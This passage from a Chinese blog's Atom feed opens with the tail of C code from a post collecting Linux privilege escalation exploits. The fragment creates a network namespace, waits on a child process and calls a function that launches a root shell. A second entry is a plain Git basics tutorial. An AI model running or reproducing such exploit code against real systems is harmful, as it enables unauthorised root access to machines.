class="keyword">if</span>(unshare(CLONE_NEWNET) != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"failed to create new network namespace\n"</span>);</span><br><span class="line">        wrapper();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    launch_rootshell();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一些经常用到的Linux提权漏洞&lt;br&gt;
    
    </summary>
    
    
      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
    
      <category term="Linux" scheme="http://reboot.cf/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Git基本使用</title>
    <link href="http://reboot.cf/2016/09/18/Git%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://reboot.cf/2016/09/18/Git基本使用/</id>
    <published>2016-09-18T02:57:06.000Z</published>
    <updated>2018-01-19T01:56:01.654Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub是一个面向开源及私有软件项目的托管平台<br><a id="more"></a><br>用GitHub备份一些代码，记录一些基本使用</p><h1 id="建立远程仓库"><a href="#建立远程仓库" class="headerlink" title="建立远程仓库"></a>建立远程仓库</h1><p>首先新建立一个<a href="https://github.com/new" target="_blank" rel="noopener">仓库</a></p><p><img src="/images/github.png" alt=""></p><p>设置远程仓库的名字，然后创建</p><h1 id="建立本地仓库"><a href="#建立本地仓库" class="headerlink" title="建立本地仓库"></a>建立本地仓库</h1><p>建立目录，或进入想建立的目录，将文件夹初始化为一个Git可以管理的仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="与远程仓库关联"><a href="#与远程仓库关联" class="headerlink" title="与远程仓库关联"></a>与远程仓库关联</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:jeffzh3ng/KIT.git</span><br></pre></td></tr></table></figure><h2 id="同步到远程仓库"><a href="#同步到远程仓库" class="headerlink" title="同步到远程仓库"></a>同步到远程仓库</h2><p>添加当前目录的所有文件到暂存区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add *//add *是添加本地仓库全部文件</span><br></pre></td></tr></table></figure><h2 id="提交暂存区到仓库区"><a href="#提交暂存区到仓库区" class="headerlink" title="提交暂存区到仓库区"></a>提交暂存区到仓库区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">"message"</span></span><br></pre></td></tr></table></figure><h2 id="显示有变更的文件"><a href="#显示有变更的文件" class="headerlink" title="显示有变更的文件"></a>显示有变更的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><h2 id="上传本地指定分支到远程仓库"><a href="#上传本地指定分支到远程仓库" class="headerlink" title="上传本地指定分支到远程仓库"></a>上传本地指定分支到远程仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h2 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git https://github.com/jeffzh3ng/KIT.git</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">常用Git命令清单</a></p><p><a href="http://rogerdudler.github.io/git-guide/index.zh.html" target="_blank" rel="noopener">Git-简明指南</a></p><p><a href="https://gist.github.com/guweigang/9848271" target="_blank" rel="noopener">Git命令大全</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GitHub是一个面向开源及私有软件项目的托管平台&lt;br&gt;
    
    </summary>
    
    
      <category term="GitHub" scheme="http://reboot.cf/tags/GitHub/"/>
    
      <category term="Git" scheme="http://reboot.cf/tags/Git/"/>
    
  </entry>
  
</feed>
